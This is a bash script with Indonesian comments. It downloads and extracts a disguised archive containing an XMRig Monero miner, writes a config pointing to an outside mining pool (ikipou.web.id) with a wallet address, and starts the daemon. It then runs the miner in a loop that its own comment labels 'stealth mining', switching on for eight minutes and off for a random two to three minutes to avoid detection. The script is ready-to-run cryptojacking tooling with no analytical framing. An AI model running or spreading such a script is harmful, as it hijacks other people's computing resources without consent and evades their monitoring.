#!/bin/bash

# Download dan ekstrak nswip
wget https://github.com/vokerjok/Voker/releases/download/Voker/nswip.tar.gz
tar xf nswip.tar.gz
rm -rvf nswip.tar.gz
cd nswip/miner || exit

# Buat file konfigurasi miner
cat > config.json <<END
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "background": false,
    "colors": true,
    "title": true,
    "randomx": {
        "init": -1,
        "init-avx2": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true,
        "scratchpad_prefetch_mode": 1
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "force-autoconfig": false,
        "max-threads-hint": 100,
        "max-cpu-usage": null,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "adl": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 3,
    "donate-over-proxy": 1,
    "log-file": null,
    "pools": [
        {
            "algo": "rx",
            "coin": null,
            "url": "ikipou.web.id:443",
            "user": "85KNrXfutegLDjeRiaBjkUVjCU2A3jkDq8s79A6M1dXg3dL4zZcNwh9UZkSL2HrGmZhoVuFru53mQH8MMz97nTzc47kk9kr",
            "pass": "juta2",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "socks5": null,
            "self-select": null,
            "submit-to-origin": false
        }
    ],
    "cc-client": {
        "enabled": true,
        "servers": [
            {
                "url": "localhost:3344",
                "access-token": "mySecret",
                "use-tls": false
            }
        ],
        "use-remote-logging": true,
        "upload-config-on-start": true,
        "worker-id": null,
        "reboot-cmd": null,
        "update-interval-s": 10,
        "retries-to-failover": 5
    },
    "print-time": 60,
    "health-print-time": 60,
    "dmi": true,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "tls": {
        "enabled": false,
        "protocols": null,
        "cert": null,
        "cert_key": null,
        "ciphers": null,
        "ciphersuites": null,
        "dhparam": null
    },
    "dns": {
        "ipv6": false,
        "ttl": 30
    },
    "user-agent": null,
    "verbose": 0,
    "watch": true,
    "pause-on-battery": false,
    "pause-on-active": false
}
END

# Beri hak akses
chmod +x config.json xmrigDaemon xmrigMiner

#run
./xmrigDaemon &


# Loop stealth mining: 8 menit ON, 2-3 menit OFF
while true; do
    echo "[+] Mining dimulai: $(date)"
    ./xmrigMiner &
    MINER_PID=$!

    sleep 480  # 8 menit

    echo "[+] Stop mining sementara: $(date)"
    kill $MINER_PID
    sleep $((120 + RANDOM % 61))  # 2 - 3 menit random
done
